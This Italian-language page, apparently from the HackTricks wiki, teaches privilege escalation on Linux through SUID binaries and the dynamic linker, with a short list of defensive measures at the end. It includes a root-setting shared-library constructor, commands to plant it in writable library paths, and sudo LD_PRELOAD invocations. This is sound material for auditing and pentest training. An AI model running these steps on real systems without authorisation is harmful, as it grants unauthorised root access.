# Abuso di Shared Library e Linker SUID

{{#include ../../banners/hacktricks-training.md}}

I file binari SUID vengono solitamente analizzati alla ricerca di esecuzioni dirette di comandi, ma i programmi SUID personalizzati possono essere vulnerabili anche attraverso il linker dinamico. Il tema comune è semplice: un eseguibile privilegiato carica codice da un percorso o una configurazione che un utente con privilegi inferiori può influenzare.

Questa pagina si concentra sui pattern generici delle tecniche: librerie mancanti, directory delle librerie scrivibili, `RPATH`/`RUNPATH`, `LD_PRELOAD` tramite sudo, configurazione del linker e confusione degli hardlink SUID.

## Enumerazione rapida

Inizia cercando file SUID insoliti e verificando se sono collegati dinamicamente:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentrati su posizioni non standard, percorsi di applicazioni personalizzati, binari di proprietà di root ma al di fuori delle directory gestite dai pacchetti e dipendenze caricate da directory scrivibili.

Verifiche utili della scrivibilità:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Iniezione di Shared Object mancanti

Alcuni binari SUID personalizzati cercano di caricare uno shared object che non esiste. Se il percorso mancante si trova sotto una directory controllata dall’attacker, il binario potrebbe caricare codice fornito dall’attacker con i privilegi dell’utente effettivo.

Trova le ricerche di librerie fallite:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Se il binario cerca `libexample.so` in un percorso scrivibile, una libreria di prova minimale può usare un costruttore. Mantieni innocua la proof-of-impact durante la validazione:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Crealo usando il nome file esatto che il binario tenta di caricare:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condizione sfruttabile non è costituita dalla sola libreria mancante. L’attaccante deve poter posizionare un shared object compatibile in un percorso che il loader privilegiato accetterà.

## Directory della libreria scrivibile

A volte tutte le dipendenze sono presenti, ma una delle directory utilizzate per risolverle è scrivibile. Questo può consentire di sostituire una libreria caricata o di inserire una libreria con priorità maggiore e lo stesso nome.

Esamina i percorsi delle dipendenze:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Se la directory è scrivibile, verifica con un approccio sicuro per le copie in un lab. Sostituire le librerie di sistema su un host in esecuzione può compromettere l'autenticazione, la gestione dei pacchetti o i servizi critici per l'avvio.

## RPATH e RUNPATH

`RPATH` e `RUNPATH` sono voci della sezione dinamica che indicano al loader dove cercare le librerie. Sono pericolose nei programmi SUID quando puntano a directory scrivibili dall'attacker.

Rilevale:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Esempio di output rischioso:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Se `/opt/app/lib` è scrivibile e il binario necessita di `libcustom.so`, l'attaccante potrebbe essere in grado di posizionarvi una `libcustom.so` dannosa:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` e `RUNPATH` non sono identici in tutti i dettagli della risoluzione, ma per la revisione dell'escalation dei privilegi la domanda pratica è la stessa: il binario SUID cerca il nome di una libreria in una directory scrivibile dall'attacker?

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Per i programmi normali, `LD_PRELOAD` e `LD_LIBRARY_PATH` possono forzare o influenzare il caricamento degli oggetti condivisi. Per i programmi SUID, il dynamic loader normalmente entra in modalità di esecuzione sicura e ignora le variabili d'ambiente pericolose.

Ciò significa che un semplice binario SUID di solito non è vulnerabile solo perché l'utente può impostare `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
L'eccezione più comune è una configurazione errata di sudo. Se `sudo -l` mostra che una variabile come `LD_PRELOAD` o `LD_LIBRARY_PATH` viene preservata, un comando consentito da sudo può caricare codice controllato dall'attaccante:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Non confondere questi casi:

- `LD_PRELOAD` contro un normale binario SUID: solitamente bloccato dall'esecuzione sicura.
- `LD_PRELOAD` preservato da sudo: potenzialmente sfruttabile.
- `.so` mancante in un path scrivibile: sfruttabile quando il binario SUID carica naturalmente quel path.
- `RPATH`/`RUNPATH` verso una directory scrivibile: sfruttabile quando è possibile controllare una libreria necessaria.
- Accesso in scrittura a `/etc/ld.so.preload` o alla configurazione del linker: a livello di sistema e ad alto impatto.

## Configurazione del Linker

Il linker dinamico legge anche la configurazione di sistema, come `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, la cache del linker e, in alcuni casi, `/etc/ld.so.preload`.

Controlli di alto valore:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
La configurazione scrivibile del linker è solitamente più grave di un singolo binario SUID vulnerabile, perché può interessare molti processi collegati dinamicamente. `/etc/ld.so.preload` è particolarmente pericoloso perché può forzare il caricamento di un shared object nei processi privilegiati.

## SUID Hardlink Confusion

Gli hardlink possono fare in modo che lo stesso inode SUID appaia con più nomi. Questo è utile per nascondere un helper privilegiato, confondere le operazioni di pulizia o aggirare una revisione ingenua basata sui percorsi.

Trova i file SUID con più di un link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ispeziona tutti i percorsi allo stesso inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
L’abuso non consiste nel fatto che un hardlink modifichi i permessi. L’abuso consiste nella confusione del path: un inode privilegiato può essere raggiungibile tramite un nome che i difensori o gli script non si aspettano. Per un workflow più approfondito su inode e hardlink, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Note difensive

- Mantieni i binari SUID ridotti al minimo, sottoposti ad audit e gestiti tramite pacchetti dove possibile.
- Evita voci `RPATH`/`RUNPATH` che puntano a directory scrivibili o gestite dalle applicazioni.
- Mantieni le directory delle librerie di proprietà di root e non scrivibili dagli utenti normali.
- Non mantenere `LD_PRELOAD`, `LD_LIBRARY_PATH` o variabili simili del loader tramite sudo.
- Monitora `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e i file SUID imprevisti.
- Esamina i file SUID collegati tramite hardlink e analizza i wrapper SUID personalizzati al di fuori dei path standard di sistema.
{{#include ../../banners/hacktricks-training.md}}
